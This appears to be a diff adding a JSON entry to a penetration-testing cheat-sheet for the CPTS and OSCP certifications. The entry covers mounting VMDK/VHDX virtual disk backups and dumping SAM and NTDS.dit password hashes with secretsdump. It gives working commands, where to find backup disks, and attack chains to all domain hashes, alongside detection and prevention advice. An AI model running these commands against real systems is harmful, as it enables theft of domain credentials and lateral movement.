@@ -1,0 +1,96 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "guestmount",
+    "secretsdump"
+  ],
+  "tags": [
+    "vmdk",
+    "vhd",
+    "hashes"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Miscellaneous Techniques",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Mount a VMDK read-only",
+      "command": "guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk"
+    },
+    {
+      "label": "Mount a VHDX read-only",
+      "command": "guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1"
+    },
+    {
+      "label": "secretsdump the hives from the mount",
+      "command": "secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL"
+    }
+  ],
+  "notes": "=== Mount Virtual Disk — Offline Credential Access from VM Images ===\nMount .vhd/.vhdx/.vmdk files to access guest OS file system offline — no VM authentication needed.\n\n=== WHY THIS IS HIGH-VALUE ===\nVirtual disk files contain complete copies of running (or snapshot) OS file systems.\nMounting offline = full file system access without authenticating to the running VM.\nPrimary target: C:\\Windows\\System32\\config (SAM + SYSTEM + SECURITY hives).\nIf DC VM is backed up → NTDS.dit accessible offline → all domain hashes.\n\n=== LINUX MOUNTING ===\nVMDK (VMware):\n  sudo apt install libguestfs-tools\n  sudo guestmount --add <image>.vmdk --inspector --ro /mnt/vmdk\n  ls /mnt/vmdk/Windows/System32/config\n\nVHD/VHDX (Hyper-V):\n  sudo guestmount --add <image>.vhdx -m /dev/sda1 --ro /mnt/vhdx\n  ls /mnt/vhdx/Windows/NTDS  (if DC)\n\nUnmount when done:\n  sudo guestunmount /mnt/vmdk\n\n=== WINDOWS MOUNTING ===\nVHD/VHDX: right-click in Explorer → Mount  OR  Disk Management → Action → Attach VHD  OR:\n  Mount-VHD -Path C:\\path\\to\\image.vhdx -ReadOnly\n  Dismount-VHD -Path C:\\path\\to\\image.vhdx\n\nVMDK: requires VMware Workstation OR use 7-Zip to extract partition content\n\n=== CREDENTIAL EXTRACTION AFTER MOUNTING ===\nLocal hashes:\n  python3 secretsdump.py -sam /mnt/vmdk/Windows/System32/config/SAM -system /mnt/vmdk/Windows/System32/config/SYSTEM LOCAL\n\nDomain hashes (from DC VM):\n  python3 secretsdump.py -ntds /mnt/vmdk/Windows/NTDS/ntds.dit -system /mnt/vmdk/Windows/System32/config/SYSTEM LOCAL\n\n=== WHERE TO FIND VIRTUAL DISK FILES ===\nBackup shares on file servers (Hyper-V CSV backups, VMware datastore exports)\nNetwork-attached storage (NAS) with automated backup jobs\nHyper-V host's C:\\Users\\Public\\Documents\\Hyper-V\\Virtual hard disks\nIT file shares with \"VM\" or \"backup\" in path\n\n=== CHAINING CONTEXT ===\nVirtual disk on backup share → mount → NTDS.dit + SYSTEM → secretsdump → all domain hashes\nHyper-V Admin → clone DC → export → mount → NTDS.dit → all domain hashes\nVM backup file → mount → web.config → DB credentials → application pivot\nFind .vmdk on share → mount on Linux → instant offline access to any Windows credentials",
+  "references": [
+    {
+      "title": "Impacket secretsdump.py",
+      "url": "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "restic-backup-restore",
+      "note": "Another offline hive-extraction route.",
+      "rel": "alternative"
+    },
+    {
+      "id": "sebackup-ntds-diskshadow",
+      "note": "On-host shadow-copy route to hives.",
+      "rel": "alternative"
+    },
+    {
+      "id": "hivenightmare",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "mount-virtual-disk",
+  "name": "Misc - Mount Virtual Disk & Dump Hashes",
+  "command": "guestmount -a <disk>.vmdk -i --ro /mnt/vmdk",
+  "description": "A found VMDK/VHD(X) is a full filesystem. Mount it read-only on Linux, then run secretsdump against the SAM/SYSTEM/SECURITY hives to recover local account hashes.",
+  "opsec": "loud",
+  "mitre": [
+    "T1003.002"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "VM backup files (VMDK, VHDX) contain complete filesystem snapshots including the Windows registry hives (SAM, SYSTEM, SECURITY, NTDS.dit). On Linux, guestmount (libguestfs) can mount these virtual disk images without booting the VM. Once mounted, the registry hives are accessible and can be processed with secretsdump.py to extract all credentials — even if the running VM has Credential Guard enabled.",
+    "prerequisites": "Access to VM backup files (.vmdk or .vhdx) via network share, backup storage, or local filesystem. Linux host with libguestfs (guestmount). secretsdump.py available.",
+    "impact": "Complete credential extraction from all user accounts on the VM, including domain account hashes if the target is a DC. Bypasses all runtime protections (Credential Guard, EDR) since the attack is offline.",
+    "detection": "Unusual read access to VMDK/VHDX backup files from non-backup processes. Backup file transfer over network. Mounting of virtual disk images on unexpected hosts. Access to backup storage by non-backup service accounts.",
+    "artifacts": "File access: .vmdk or .vhdx read by non-hypervisor process | Network: large backup file transfer to attacker system | Process: guestmount and secretsdump execution",
+    "prevention": "Encrypt VM backup files at rest (BitLocker, vSphere VM Encryption, Azure Disk Encryption). Restrict access to backup storage to dedicated backup service accounts only. Audit access to backup repositories. Use dedicated backup networks isolated from production.",
+    "misconfiguration": "VM backup files stored on a network share accessible to domain users. Backup files unencrypted. No access monitoring on backup storage. DC backup files accessible from compromised workstations.",
+    "vulnerable_config": "# On attacker Linux system:\nguestmount --add OFFICEMGR.vmdk --inspector --ro /mnt/vhd -v\ncd /mnt/vhd/Windows/System32/config\n# Access SAM, SYSTEM, NTDS.dit files\nsecretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL",
+    "secure_config": "# Encrypt VM backups:\n# vSphere: Enable VM Encryption on backup policies\n# Azure: Enable Azure Disk Encryption before backup\n\n# Restrict backup storage ACL:\nicacls \\\\backupserver\\vmbackups /inheritance:r /grant 'INLANEFREIGHT\\svc_backup:(M)'\n\n# Monitor backup storage access:\n# Alert: backup files read by non-svc_backup accounts",
+    "sources": [
+      "HTB M26",
+      "MITRE T1003.002",
+      "MITRE T1552.001"
+    ]
+  }
+}
